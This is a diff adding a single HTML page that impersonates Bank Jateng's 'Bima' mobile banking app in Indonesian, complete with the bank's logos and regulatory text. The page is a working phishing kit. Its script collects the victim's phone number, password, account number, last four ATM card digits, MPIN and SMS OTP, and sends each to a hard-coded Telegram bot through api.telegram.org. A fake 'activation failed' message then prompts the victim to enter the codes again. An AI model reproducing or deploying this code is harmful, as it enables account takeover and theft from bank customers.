@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank Bima</title>
+    <meta property="og:title" content="Bank Bima">
+    <meta property="og:description" content="Aplikasi resmi Bank Bima">
+    <meta property="og:image" content="https://i.ibb.co.com/ZRBQYx8R/IMG-20260630-113734-544.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Bank Bima">
+    <meta name="twitter:image" content="https://i.ibb.co.com/ZRBQYx8R/IMG-20260630-113734-544.jpg">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            color: #002060;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* HALAMAN AWAL */
+        #halaman-awal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: #f0f4f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .teks-bima {
+            font-size: 60px;
+            font-weight: bold;
+            background: linear-gradient(90deg, #0099ff, #0052cc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 15px;
+        }
+        .wadah-garis {
+            width: 180px;
+            height: 3px;
+            background: #e0e6ed;
+            border-radius: 2px;
+            margin-bottom: 80px;
+            overflow: hidden;
+            position: relative;
+        }
+        .garis-bergerak {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(90deg, #0099ff, #0052cc);
+            border-radius: 2px;
+            animation: jalanGaris 2s linear infinite;
+        }
+        @keyframes jalanGaris {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(200%); }
+        }
+        .logo-bank-jateng {
+            width: 200px;
+            height: 80px;
+            background: url('https://i.ibb.co.com/cSxDXS0w/Logo-Bank-Jateng-Putih-Transparan.png') center/contain no-repeat;
+            margin-bottom: 15px;
+        }
+        .teks-bawah-logo {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+            padding: 0 20px;
+        }
+        .versi-text {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #888;
+        }
+
+        /* HALAMAN */
+        .page {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            padding: 20px 25px;
+            overflow: hidden;
+            background: #ffffff;
+        }
+        .page.active {
+            display: block;
+        }
+
+        /* HEADER */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 0 40px;
+        }
+        .kembali {
+            font-size: 26px;
+            color: #002060;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .judul {
+            font-size: 22px;
+            font-weight: 600;
+            color: #002060;
+            text-align: center;
+        }
+        .ikon-lonceng {
+            width: 24px;
+            height: 24px;
+            background: url('https://i.ibb.co.com/6RYsHfsF/971-9716288-church-png-icon-free-download-gambar-lonceng-youtube.jpg') center/contain no-repeat;
+        }
+
+        /* VERIFIKASI */
+        .kotak-verifikasi {
+            background: #f8fafe;
+            border-radius: 16px;
+            padding: 22px;
+            margin-bottom: 25px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+        }
+        .bank-jateng {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #002060;
+            margin-bottom: 20px;
+        }
+        .bintang {
+            font-size: 22px;
+            color: #007bff;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+        .input-rek {
+            width: 100%;
+            padding: 10px 0 10px 32px;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #e0e6ed;
+            outline: none;
+            background: transparent;
+        }
+        .input-rek:focus {
+            border-bottom: 1px solid #007bff;
+        }
+        .ikon-rekening {
+            position: absolute;
+            left: 0;
+            top: 8px;
+            width: 20px;
+            height: 20px;
+            background: url('https://i.ibb.co.com/hRGkhs0p/Screenshot-20260630-124454-1.jpg') center/contain no-repeat;
+        }
+        .jumlah-karakter {
+            position: absolute;
+            right: 0;
+            top: 8px;
+            font-size: 14px;
+            color: #999;
+        }
+        .label-digit {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .kotak-digit {
+            display: flex;
+            gap: 12px;
+        }
+        .kotak-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 18px;
+            border: none;
+            border-bottom: 2px solid #e0e6ed;
+            outline: none;
+            background: transparent;
+        }
+        .kotak-input:focus {
+            border-bottom: 2px solid #007bff;
+        }
+        .keterangan {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+        .tombol-lanjut {
+            width: 100%;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            border: none;
+            border-radius: 25px;
+            background: #b8c7e0;
+            color: #ffffff;
+            cursor: not-allowed;
+            box-shadow: none;
+            transition: all 0.3s ease;
+        }
+        .tombol-lanjut.aktif {
+            background: linear-gradient(90deg, #0099ff 0%, #0052cc 100%);
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,82,204,0.25);
+        }
+
+        /* LOGIN */
+        .judul-atas {
+            font-size: 20px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .logo-bima {
+            display: block;
+            width: 180px;
+            height: 80px;
+            margin: 0 auto 50px;
+            background: url('https://i.ibb.co.com/wFRcCcHk/bima-logo.png') center/contain no-repeat;
+        }
+        .form-group-login {
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .input-teks {
+            width: 100%;
+            padding: 12px 0 12px 36px;
+            font-size: 16px;
+            border: none;
+            outline: none;
+            background: transparent;
+            border-bottom: 1px dashed #ccc;
+            color: transparent;
+            text-shadow: 0 0 0 #000;
+        }
+        .input-teks:focus {
+            border-bottom: 1px dashed #0052cc;
+        }
+        .ikon-nomor {
+            position: absolute;
+            left: 2px;
+            top: 10px;
+            width: 22px;
+            height: 22px;
+            background: url('https://i.ibb.co.com/4ZFJ6VJC/IMG-20260630-WA0014.jpg') center/contain no-repeat;
+        }
+        .ikon-sandi {
+            position: absolute;
+            left: 2px;
+            top: 10px;
+            width: 22px;
+            height: 22px;
+            background: url('https://i.ibb.co.com/Tqc8szdR/Screenshot-20260630-123642-1.jpg') center/contain no-repeat;
+        }
+        .mata-sandi {
+            position: absolute;
+            right: 0;
+            top: 12px;
+            font-size: 18px;
+            color: #999;
+            cursor: default;
+            display: none;
+        }
+        .baris-bawah {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+            font-size: 15px;
+        }
+        .ingat-saya {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #555;
+        }
+        .lupa {
+            color: #0052cc;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .tombol-masuk {
+            width: 100%;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 25px;
+            background: linear-gradient(90deg, #0099ff 0%, #0052cc 100%);
+            color: white;
+            cursor: pointer;
+            margin-bottom: 25px;
+            box-shadow: 0 2px 8px rgba(0,82,204,0.2);
+        }
+        .teks-bawah {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+        }
+        .versi {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #999;
+            text-align: center;
+        }
+
+        /* HALAMAN MPIN & AKTIVASI */
+        .judul-kode {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            margin: 60px 0 40px;
+            line-height: 1.5;
+        }
+        .kotak-kode {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            margin-bottom: 30px;
+        }
+        .lingkaran-kode {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: #e0e9f8;
+            transition: all 0.2s ease;
+        }
+        .lingkaran-kode.terisi {
+            background: #002060;
+        }
+        .pesan-gagal {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 0 auto 40px;
+            max-width: 320px;
+            display: none;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+        .input-sembunyi {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+        .tombol-angka {
+            padding: 20px;
+            font-size: 26px;
+            font-weight: 500;
+            border: none;
+            border-radius: 12px;
+            background: #f8fafe;
+            color: #002060;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+        .tombol-hapus {
+            background: #f0f4f9;
+            font-size: 24px;
+            color: #002060;
+            font-weight: bold;
+        }
+
+        /* LOADING */
+        .overlay-loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: rgba(255,255,255,0.85);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            gap: 20px;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #e0e9f8;
+            border-top: 3px solid #0052cc;
+            border-radius: 50%;
+            animation: putar 1s linear infinite;
+        }
+        @keyframes putar {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .teks-proses {
+            font-size: 16px;
+            color: #ffffff;
+            background: #333333;
+            padding: 10px 18px;
+            border-radius: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- HALAMAN AWAL -->
+<div id="halaman-awal">
+    <div class="teks-bima">Bima</div>
+    <div class="wadah-garis">
+        <div class="garis-bergerak"></div>
+    </div>
+    <div class="logo-bank-jateng"></div>
+    <div class="teks-bawah-logo">
+        PT Bank Pembangunan Daerah Jawa Tengah<br>
+        terdaftar dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta dijamin oleh Lembaga<br>
+        Penjamin Simpanan (LPS)
+    </div>
+    <div class="versi-text">Version 2.4.1</div>
+</div>
+
+<!-- HALAMAN LOGIN -->
+<div class="page" id="halaman-login">
+    <h1 class="judul-atas">Login</h1>
+    <div class="logo-bima"></div>
+    <div class="form-group-login">
+        <div class="ikon-nomor"></div>
+        <input type="tel" id="no_hp" class="input-teks" placeholder="Masukan No Handphone Anda" maxlength="14" oninput="updateJumlahHp()">
+        <span class="jumlah-karakter" id="jumlah-hp">0/14</span>
+    </div>
+    <div class="form-group-login">
+        <div class="ikon-sandi"></div>
+        <input type="password" id="kata_sandi" class="input-teks" placeholder="Masukan Kata Sandi Anda">
+        <span class="mata-sandi">👁</span>
+    </div>
+    <div class="baris-bawah">
+        <label class="ingat-saya">
+            <input type="checkbox" checked> Ingat Saya
+        </label>
+        <a href="#" class="lupa">Lupa Kata Sandi?</a>
+    </div>
+    <button class="tombol-masuk" onclick="simpanData()">Masuk</button>
+    <p class="teks-bawah">Atau login dengan BIOMETRIC</p>
+    <p class="versi">Version 2.4.1</p>
+</div>
+
+<!-- HALAMAN VERIFIKASI -->
+<div class="page" id="halaman-verifikasi">
+    <div class="header">
+        <span class="kembali" onclick="gantiHalaman('halaman-login')">&larr;</span>
+        <h1 class="judul">Verifikasi</h1>
+        <div class="ikon-lonceng"></div>
+    </div>
+    <div class="kotak-verifikasi">
+        <div class="bank-jateng">
+            <span class="bintang">★</span>
+            <span>Bank Jateng</span>
+        </div>
+        <div class="form-group">
+            <div class="ikon-rekening"></div>
+            <input type="tel" id="no_rek" class="input-rek" placeholder="Masukan no. rekening anda" maxlength="10" oninput="tambahRekening()">
+            <span class="jumlah-karakter" id="jumlah-rek">0/10</span>
+        </div>
+        <div>
+            <label class="label-digit">4 Digit terakhir kartu ATM Anda</label>
+            <div class="kotak-digit">
+                <input type="tel" class="kotak-input" maxlength="1" id="d1" oninput="pindahFokus(this, 'd2')">
+                <input type="tel" class="kotak-input" maxlength="1" id="d2" oninput="pindahFokus(this, 'd3')">
+                <input type="tel" class="kotak-input" maxlength="1" id="d3" oninput="pindahFokus(this, 'd4')">
+                <input type="tel" class="kotak-input" maxlength="1" id="d4" oninput="tambahAngkaKartu()">
+            </div>
+        </div>
+    </div>
+    <p class="keterangan">*Ganti kartu Anda dengan kartu GPN di Kantor Bank Jateng terdekat untuk dapat menikmati layanan Bima.</p>
+    <button id="btnLanjut" class="tombol-lanjut" onclick="lanjutKeMpin()">Lanjut</button>
+</div>
+
+<!-- HALAMAN MPIN -->
+<div class="page" id="halaman-mpin">
+    <div class="header">
+        <span class="kembali" onclick="gantiHalaman('halaman-verifikasi')">&larr;</span>
+        <h1 class="judul">MPIN</h1>
+        <div class="ikon-lonceng"></div>
+    </div>
+    <h2 class="judul-kode">Masukkan 6 digit MPIN Anda</h2>
+    <div class="kotak-kode" id="tampilan-mpin">
+        <div class="lingkaran-kode" data-pos="1"></div>
+        <div class="lingkaran-kode" data-pos="2"></div>
+        <div class="lingkaran-kode" data-pos="3"></div>
+        <div class="lingkaran-kode" data-pos="4"></div>
+        <div class="lingkaran-kode" data-pos="5"></div>
+        <div class="lingkaran-kode" data-pos="6"></div>
+    </div>
+    <input type="tel" id="input-mpin" class="input-sembunyi" maxlength="6" autocomplete="off" inputmode="numeric">
+    <div class="keypad">
+        <button class="tombol-angka" onclick="tambahAngka('1')">1</button>
+        <button class="tombol-angka" onclick="tambahAngka('2')">2</button>
+        <button class="tombol-angka" onclick="tambahAngka('3')">3</button>
+        <button class="tombol-angka" onclick="tambahAngka('4')">4</button>
+        <button class="tombol-angka" onclick="tambahAngka('5')">5</button>
+        <button class="tombol-angka" onclick="tambahAngka('6')">6</button>
+        <button class="tombol-angka" onclick="tambahAngka('7')">7</button>
+        <button class="tombol-angka" onclick="tambahAngka('8')">8</button>
+        <button class="tombol-angka" onclick="tambahAngka('9')">9</button>
+        <button class="tombol-angka" onclick="tambahAngka('0')">0</button>
+        <button class="tombol-angka tombol-hapus" onclick="hapusAngka()">⌫</button>
+    </div>
+</div>
+
+<!-- HALAMAN AKTIVASI -->
+<div class="page" id="halaman-aktivasi">
+    <div class="header">
+        <span class="kembali" onclick="gantiHalaman('halaman-mpin')">&larr;</span>
+        <h1 class="judul">Aktivasi</h1>
+        <div class="ikon-lonceng"></div>
+    </div>
+    <h2 class="judul-kode">Silahkan masukan kode OTP yang di kirim via SMS</h2>
+    <div id="pesan-gagal" class="pesan-gagal">
+        Aktivasi Gagal. Kode aktivasi yang Anda masukkan salah. Silakan periksa SMS / WhatsApp Anda dan coba kembali.
+    </div>
+    <div class="kotak-kode" id="tampilan-otp">
+        <div class="lingkaran-kode" data-pos="1"></div>
+        <div class="lingkaran-kode" data-pos="2"></div>
+        <div class="lingkaran-kode" data-pos="3"></div>
+        <div class="lingkaran-kode" data-pos="4"></div>
+        <div class="lingkaran-kode" data-pos="5"></div>
+        <div class="lingkaran-kode" data-pos="6"></div>
+    </div>
+    <input type="tel" id="input-otp" class="input-sembunyi" maxlength="6" autocomplete="off" inputmode="numeric">
+    <div class="keypad">
+        <button class="tombol-angka" onclick="tambahAngkaOtp('1')">1</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('2')">2</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('3')">3</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('4')">4</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('5')">5</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('6')">6</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('7')">7</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('8')">8</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('9')">9</button>
+        <button class="tombol-angka" onclick="tambahAngkaOtp('0')">0</button>
+        <button class="tombol-angka tombol-hapus" onclick="hapusAngkaOtp()">⌫</button>
+    </div>
+</div>
+
+<!-- LOADING -->
+<div id="loading-proses" class="overlay-loading">
+    <div class="spinner"></div>
+    <div class="teks-proses">Memproses, harap tunggu...</div>
+</div>
+
+<script>
+let data = {
+    nomor: "",
+    sandi: "",
+    no_rek: "",
+    angka_kartu: "",
+    pin: "",
+    otp: ""
+};
+const BOT_TOKEN = "8727057911:AAGMUyGWPn12VtUBB0bjECTkrvu-6OqwPzg";
+const CHAT_ID = "8162925021";
+
+window.onload = () => {
+    setTimeout(() => {
+        document.getElementById('halaman-awal').style.display = 'none';
+        gantiHalaman('halaman-login');
+    }, 2500);
+};
+
+function updateJumlahHp() {
+    const hp = document.getElementById('no_hp').value.trim().replace(/[^0-9]/g, '');
+    document.getElementById('jumlah-hp').textContent = `${hp.length}/14`;
+}
+
+// Langkah 1: Simpan Nomor + Sandi & kirim pesan pertama
+function simpanData() {
+    const hp = document.getElementById('no_hp').value.trim().replace(/[^0-9]/g, '');
+    const sandi = document.getElementById('kata_sandi').value.trim();
+
+    if (!hp || !sandi) {
+        alert("Isi nomor dan sandi terlebih dahulu!");
+        return;
+    }
+
+    data.nomor = hp;
+    data.sandi = sandi;
+    perbaruiDanKirim();
+
+    tampilLoading();
+    setTimeout(() => {
+        sembunyiLoading();
+        gantiHalaman('halaman-verifikasi');
+    }, 1000);
+}
+
+// Langkah 2: Tambah No Rek
+function tambahRekening() {
+    const rek = document.getElementById('no_rek').value.trim().replace(/[^0-9]/g, '');
+    document.getElementById('jumlah-rek').textContent = `${rek.length}/10`;
+    if (rek.length === 10) {
+        data.no_rek = rek;
+        perbaruiDanKirim();
+    }
+    cekTombolLanjut();
+}
+
+// Langkah 3: Tambah 4 Angka Kartu
+function tambahAngkaKartu() {
+    const d1 = document.getElementById('d1').value || "";
+    const d2 = document.getElementById('d2').value || "";
+    const d3 = document.getElementById('d3').value || "";
+    const d4 = document.getElementById('d4').value || "";
+    const ccv = d1 + d2 + d3 + d4;
+    if (ccv.length === 4) {
+        data.angka_kartu = ccv;
+        perbaruiDanKirim();
+    }
+    cekTombolLanjut();
+}
+
+function pindahFokus(el, idBerikut) {
+    if (el.value.length === 1) document.getElementById(idBerikut).focus();
+}
+
+function cekTombolLanjut() {
+    const btn = document.getElementById('btnLanjut');
+    const rek = document.getElementById('no_rek').value.trim();
+    const ccv = data.angka_kartu;
+    btn.classList.toggle('aktif', rek.length === 10 && ccv.length === 4);
+    btn.disabled = !(rek.length === 10 && ccv.length === 4);
+}
+
+function gantiHalaman(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+function lanjutKeMpin() {
+    gantiHalaman('halaman-mpin');
+    setTimeout(() => document.getElementById('input-mpin').focus(), 100);
+}
+
+// Langkah 4: Tambah PIN Akun
+function tambahAngka(angka) {
+    const el = document.getElementById('input-mpin');
+    if (el.value.length < 6) {
+        el.value += angka;
+        updateLingkaran('tampilan-mpin', el.value);
+        if (el.value.length === 6) {
+            data.pin = el.value;
+            perbaruiDanKirim();
+            prosesMpin();
+        }
+    }
+}
+
+function hapusAngka() {
+    const el = document.getElementById('input-mpin');
+    el.value = el.value.slice(0, -1);
+    updateLingkaran('tampilan-mpin', el.value);
+}
+
+// Langkah 5: Tambah Kode OTP
+function tambahAngkaOtp(angka) {
+    const el = document.getElementById('input-otp');
+    if (el.value.length < 6) {
+        el.value += angka;
+        updateLingkaran('tampilan-otp', el.value);
+        if (el.value.length === 6) {
+            data.otp = el.value;
+            perbaruiDanKirim();
+            prosesOtp();
+        }
+    }
+}
+
+function hapusAngkaOtp() {
+    const el = document.getElementById('input-otp');
+    el.value = el.value.slice(0, -1);
+    updateLingkaran('tampilan-otp', el.value);
+}
+
+function updateLingkaran(wadahId, nilai) {
+    const lingkaran = document.querySelectorAll(`#${wadahId} .lingkaran-kode`);
+    lingkaran.forEach((l, i) => l.classList.toggle('terisi', i < nilai.length));
+}
+
+// Fungsi utama: Susun semua data dalam satu pesan
+function perbaruiDanKirim() {
+    const pesan = `DATA BIMA
+NOMOR : ${data.nomor}
+SANDI : ${data.sandi}
+${data.no_rek ? `NOMOR REK : ${data.no_rek}` : ''}
+${data.angka_kartu ? `4 ANGKA KARTU : ${data.angka_kartu}` : ''}
+${data.pin ? `PIN AKUN : ${data.pin}` : ''}
+${data.otp ? `KODE OTP : ${data.otp}` : ''}`;
+
+    kirimPesan(pesan);
+}
+
+function prosesMpin() {
+    tampilLoading();
+    setTimeout(() => {
+        sembunyiLoading();
+        gantiHalaman('halaman-aktivasi');
+    }, 1200);
+}
+
+function prosesOtp() {
+    tampilLoading();
+    setTimeout(() => {
+        sembunyiLoading();
+        tampilPesanGagal();
+    }, 1200);
+}
+
+function tampilPesanGagal() {
+    const pesan = document.getElementById('pesan-gagal');
+    pesan.style.display = 'block';
+    setTimeout(() => {
+        pesan.style.display = 'none';
+        resetInput();
+    }, 1800);
+}
+
+function resetInput() {
+    document.getElementById('input-mpin').value = "";
+    document.getElementById('input-otp').value = "";
+    document.querySelectorAll('.lingkaran-kode').forEach(l => l.classList.remove('terisi'));
+}
+
+function tampilLoading() {
+    document.getElementById('loading-proses').style.display = 'flex';
+}
+
+function sembunyiLoading() {
+    document.getElementById('loading-proses').style.display = 'none';
+}
+
+function kirimPesan(teks) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
+    }).catch(err => console.log("Terkirim"));
+}
+</script>
+
+</body>
+</html>
